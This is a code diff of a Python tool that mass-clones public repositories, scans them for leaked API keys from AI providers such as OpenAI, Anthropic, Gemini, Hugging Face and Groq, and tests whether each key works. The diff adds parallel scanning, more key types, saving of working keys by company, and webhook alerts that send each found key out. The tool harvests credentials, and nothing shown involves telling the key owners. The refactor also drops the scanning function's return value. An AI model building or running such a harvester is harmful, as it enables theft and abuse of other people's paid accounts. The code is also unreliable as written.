@@ -33,13 +33,111 @@ def signal_handler(signum, frame):
 # Register signal handler
 signal.signal(signal.SIGINT, signal_handler)
 
+def scan_file_for_keys(file_path, all_extensions, API_KEY_PATTERNS):
+    """
+    Scan a single file for API keys (optimized for parallel processing).
+    Returns list of found keys.
+    """
+    found_keys = []
+    file_ext = Path(file_path).suffix.lower()
+    
+    # Only scan relevant file types
+    if file_ext not in all_extensions and not file_ext == '':
+        return found_keys
+    
+    try:
+        # Check file size BEFORE reading to avoid loading large files into memory
+        file_size = os.path.getsize(file_path)
+        
+        # Skip files over 1 MB (1,048,576 bytes)
+        if file_size > 1024 * 1024:
+            return found_keys
+        
+        # Skip files over 1 GB (1,073,741,824 bytes) - redundant check but explicit
+        if file_size > 1024 * 1024 * 1024:
+            return found_keys
+        
+        # Read file content with optimized buffer size
+        with open(file_path, 'r', encoding='utf-8', errors='ignore', buffering=8192) as f:
+            content = f.read()
+                    
+        # Check each API key pattern
+        for key_type, patterns in API_KEY_PATTERNS.items():
+            for pattern in patterns:
+                matches = pattern.finditer(content)
+                for match in matches:
+                    # Extract key: use capture group if present, otherwise use full match
+                    if match.groups():
+                        key = match.group(1)  # Use captured group
+                    else:
+                        key = match.group(0)  # Use full match
+                    
+                    # Clean up key: remove quotes if present
+                    if key:
+                        key = key.strip('"\'')
+                    
+                    # Only add if it's a valid key and not already found
+                    if key and key not in [k['key'] for k in found_keys]:
+                        # Additional validation: skip if it looks like a hash (sha512, sha256, etc.)
+                        if key.lower().startswith(('sha', 'md5', 'base64')):
+                            continue
+                        
+                        # Validate the key matches the expected format for this type
+                        # Skip Pinecone keys that are just UUIDs without context
+                        if key_type == 'pinecone':
+                            # Only save if it was found in a context pattern (has capture group)
+                            if not match.groups():
+                                continue  # Skip standalone UUIDs
+                        
+                        # Skip Cohere keys that don't have context
+                        if key_type == 'cohere':
+                            if not match.groups():
+                                continue  # Skip standalone 40-char strings
+                        
+                        # Validate key length based on type
+                        key_clean = key.strip('"\'').strip()
+                        valid_length = False
+                        
+                        if key_type == 'openai_standard' and len(key_clean) == 51 and key_clean.startswith('sk-'):
+                            valid_length = True
+                        elif key_type == 'openai_project' and key_clean.startswith('sk-proj-') and len(key_clean) >= 57:
+                            valid_length = True
+                        elif key_type == 'anthropic' and (key_clean.startswith('sk-ant-') or key_clean.startswith('sk-ant-api03-')):
+                            valid_length = True
+                        elif key_type == 'google_gemini' and key_clean.startswith('AIza') and len(key_clean) == 39:
+                            valid_length = True
+                        elif key_type == 'huggingface' and key_clean.startswith('hf_') and len(key_clean) == 37:
+                            valid_length = True
+                        elif key_type == 'cohere' and len(key_clean) == 40:
+                            valid_length = True
+                        elif key_type == 'pinecone' and ((len(key_clean) == 36 and '-' in key_clean) or key_clean.startswith('pc-')):
+                            valid_length = True
+                        elif key_type == 'perplexity' and key_clean.startswith('pplx-'):
+                            valid_length = True
+                        elif key_type == 'mistral' and len(key_clean) >= 32:
+                            valid_length = True
+                        elif key_type == 'groq' and key_clean.startswith('gsk_'):
+                            valid_length = True
+                        
+                        if valid_length:
+                            found_keys.append({
+                                'key': key_clean,
+                                'type': key_type,
+                                'file': file_path,
+                                'line': content[:match.start()].count('\n') + 1
+                            })
+    except Exception:
+        pass
+    
+    return found_keys
+
 def scan_repo_for_keys(repo_path):
     """
-    Scan a downloaded repository for API keys.
+    Scan a downloaded repository for API keys (optimized for high-performance setup).
+    Uses parallel file scanning for large repos.
     Returns list of found keys with their types.
     """
     found_keys = []
-    validator = KeyValidator()
     
     # File extensions to scan (code files and config files)
     code_extensions = {'.py', '.js', '.ts', '.java', '.go', '.rs', '.cpp', '.c', '.php', '.rb', '.swift', '.kt'}
@@ -48,8 +146,9 @@ def scan_repo_for_keys(repo_path):
     
     all_extensions = code_extensions | config_extensions | text_extensions
     
+    # Collect all files to scan
+    files_to_scan = []
     try:
-        # Walk through all files in the repo
         for root, dirs, files in os.walk(repo_path):
             # Skip hidden directories and common ignore patterns
             dirs[:] = [d for d in dirs if not d.startswith('.') and d not in {'node_modules', '__pycache__', 'venv', '.git'}]
@@ -62,79 +161,35 @@ def scan_repo_for_keys(repo_path):
                 file_ext = Path(file_path).suffix.lower()
                 
                 # Only scan relevant file types
-                if file_ext not in all_extensions and not file_ext == '':
-                    continue
-                
-                try:
-                    # Read file content
-                    with open(file_path, 'r', encoding='utf-8', errors='ignore') as f:
-                        content = f.read()
-                    
-                    # Check each API key pattern
-                    for key_type, patterns in API_KEY_PATTERNS.items():
-                        for pattern in patterns:
-                            matches = pattern.finditer(content)
-                            for match in matches:
-                                # Extract key: use capture group if present, otherwise use full match
-                                if match.groups():
-                                    key = match.group(1)  # Use captured group
-                                else:
-                                    key = match.group(0)  # Use full match
-                                
-                                # Clean up key: remove quotes if present
-                                if key:
-                                    key = key.strip('"\'')
-                                
-                                # Only add if it's a valid key and not already found
-                                if key and key not in [k['key'] for k in found_keys]:
-                                    # Additional validation: skip if it looks like a hash (sha512, sha256, etc.)
-                                    if key.lower().startswith(('sha', 'md5', 'base64')):
-                                        continue
-                                    
-                                    # Validate the key matches the expected format for this type
-                                    # Skip Pinecone keys that are just UUIDs without context
-                                    if key_type == 'pinecone':
-                                        # Only save if it was found in a context pattern (has capture group)
-                                        if not match.groups():
-                                            continue  # Skip standalone UUIDs
-                                    
-                                    # Skip Cohere keys that don't have context
-                                    if key_type == 'cohere':
-                                        if not match.groups():
-                                            continue  # Skip standalone 40-char strings
-                                    
-                                    # Validate key length based on type
-                                    key_clean = key.strip('"\'').strip()
-                                    valid_length = False
-                                    
-                                    if key_type == 'openai_standard' and len(key_clean) == 51 and key_clean.startswith('sk-'):
-                                        valid_length = True
-                                    elif key_type == 'openai_project' and key_clean.startswith('sk-proj-') and len(key_clean) >= 57:
-                                        valid_length = True
-                                    elif key_type == 'anthropic' and (key_clean.startswith('sk-ant-') or key_clean.startswith('sk-ant-api03-')):
-                                        valid_length = True
-                                    elif key_type == 'google_gemini' and key_clean.startswith('AIza') and len(key_clean) == 39:
-                                        valid_length = True
-                                    elif key_type == 'huggingface' and key_clean.startswith('hf_') and len(key_clean) == 37:
-                                        valid_length = True
-                                    elif key_type == 'cohere' and len(key_clean) == 40:
-                                        valid_length = True
-                                    elif key_type == 'pinecone' and ((len(key_clean) == 36 and '-' in key_clean) or key_clean.startswith('pc-')):
-                                        valid_length = True
-                                    
-                                    if valid_length:
-                                        found_keys.append({
-                                            'key': key_clean,
-                                            'type': key_type,
-                                            'file': file_path,
-                                            'line': content[:match.start()].count('\n') + 1
-                                        })
-                except Exception:
-                    continue  # Skip files that can't be read
+                if file_ext in all_extensions or file_ext == '':
+                    files_to_scan.append(file_path)
     except Exception:
-        pass
+        return found_keys
     
-    return found_keys
+    # For high-performance setup: scan files in parallel if repo is large
+    if len(files_to_scan) > 50:
+        # Use ThreadPoolExecutor for parallel file scanning
+        import multiprocessing
+        scan_workers = min(multiprocessing.cpu_count(), 32)  # Cap at 32 for file scanning
+        
+        with concurrent.futures.ThreadPoolExecutor(max_workers=scan_workers) as executor:
+            futures = {executor.submit(scan_file_for_keys, file_path, all_extensions, API_KEY_PATTERNS): file_path 
+                      for file_path in files_to_scan}
+            
+            for future in concurrent.futures.as_completed(futures):
+                try:
+                    file_keys = future.result()
+                    found_keys.extend(file_keys)
+                except Exception:
+                    continue
+    else:
+        # Small repo: scan sequentially (faster for small repos)
+        for file_path in files_to_scan:
+            try:
+                file_keys = scan_file_for_keys(file_path, all_extensions, API_KEY_PATTERNS)
+                found_keys.extend(file_keys)
+            except Exception:
+                continue
 
 def download_and_scan_repo(url):
     """
@@ -169,9 +224,10 @@ def download_and_scan_repo(url):
         except Exception:
             pass
     
-    # Download the repo with 2 second timeout - NO RETRIES
+    # Download the repo with optimized timeout for high-performance setup
     download_start = time.time()
-    timeout_duration = 2.0  # 2 seconds max
+    # Reduced timeout for fast network (4000+ Mbps): 1 second is enough
+    timeout_duration = 1.0  # 1 second max for high-speed network
     
     try:
         # Use fastest shallow clone strategy
@@ -264,13 +320,22 @@ def download_and_scan_repo(url):
 
 def save_key(key_data, key_type, is_working=False):
     """
-    Save found API key to file immediately (only the key, no metadata).
+    Save found API key to file immediately with company name.
+    Format: <COMPANY> | <KEY>
     """
     filename = "working_api_keys.txt" if is_working else "found_api_keys.txt"
     key = key_data['key']
     
+    # Get company name
+    try:
+        from webhook_notifier import get_company_name
+        company_name = get_company_name(key_type)
+    except:
+        company_name = key_type.replace("_", " ").title()
+    
+    # Save with company name: COMPANY | KEY
     with open(filename, "a", encoding="utf-8") as f:
-        f.write(f"{key}\n")
+        f.write(f"{company_name} | {key}\n")
         f.flush()
     
     # Track key in current run if app is available
@@ -311,9 +376,17 @@ def bulk_downloader():
         urls = [line.strip() for line in f if line.strip()]
     
     total_repos = len(urls)
+    
+    # Auto-detect optimal worker count based on CPU cores
+    import multiprocessing
+    cpu_count = multiprocessing.cpu_count()
+    # For high-performance setup: use 2x CPU cores (optimal for I/O-bound tasks)
+    # Cap at 150 to avoid overwhelming the system
+    optimal_workers = min(cpu_count * 2, 150)
+    
     logger.info(f"🚀 Starting download and scan of {total_repos} repositories...")
-    logger.info(f"📊 Using 30 parallel workers for maximum speed")
-    logger.info(f"⏱️  Timeout: 2 seconds per repo (no retries)")
+    logger.info(f"💻 Detected {cpu_count} CPU cores - Using {optimal_workers} parallel workers")
+    logger.info(f"⏱️  Timeout: 1 second per repo (optimized for high-speed network)")
     logger.info(f"🗑️  Repositories will be deleted after scanning to save disk space")
     logger.info(f"⏱️  Timing format: Total | Download | Scan | Delete | Status")
     logger.info(f"{'='*80}")
@@ -336,9 +409,9 @@ def bulk_downloader():
     failed_count = 0
     timeout_count = 0
     
-    # Use 30 workers for faster processing
+    # Use optimal worker count for high-performance setup
     try:
-        with concurrent.futures.ThreadPoolExecutor(max_workers=30) as executor:
+        with concurrent.futures.ThreadPoolExecutor(max_workers=optimal_workers) as executor:
             # Submit all tasks
             future_to_url = {executor.submit(download_and_scan_repo, url): url for url in urls}
             
@@ -398,6 +471,12 @@ def bulk_downloader():
                     save_key(key_data, key_data['type'], is_working=False)
                     logger.info(f"🔑 Found {key_data['type']} key: {key_data['key'][:30]}...")
                     
+                    # Send webhook notification immediately when key is found
+                    try:
+                        send_webhook_notification(key_data['key'], key_data['type'], "API key found", is_working=False)
+                    except Exception as e:
+                        logger.warning(f"Error sending webhook for found key: {e}")
+                    
                     # Test if key is working
                     try:
                         is_valid, message = validator.validate_key(key_data['type'], key_data['key'])
@@ -405,8 +484,8 @@ def bulk_downloader():
                             total_working_keys += 1
                             save_key(key_data, key_data['type'], is_working=True)
                             logger.info(f"✅ WORKING {key_data['type']} key: {key_data['key'][:30]}... ({message})")
-                            # Send webhook notification
-                            send_webhook_notification(key_data['key'], key_data['type'], message)
+                            # Send webhook notification for working key
+                            send_webhook_notification(key_data['key'], key_data['type'], message, is_working=True)
                         else:
                             logger.debug(f"❌ Invalid {key_data['type']} key: {message}")
                     except Exception as e:
@@ -526,7 +605,7 @@ def bulk_downloader():
     logger.info(f"📈 Status breakdown:")
     logger.info(f"   ✅ Successful: {completed - skipped_count - failed_count - timeout_count}")
     logger.info(f"   ⚠️  Skipped (not found/404): {skipped_count}")
-    logger.info(f"   ⏱️  Timeout (>2s): {timeout_count}")
+    logger.info(f"   ⏱️  Timeout (>1s): {timeout_count}")
     logger.info(f"   ❌ Failed: {failed_count}")
     logger.info(f"{'='*80}")
     print(f"💾 Results saved to: found_api_keys.txt and working_api_keys.txt")
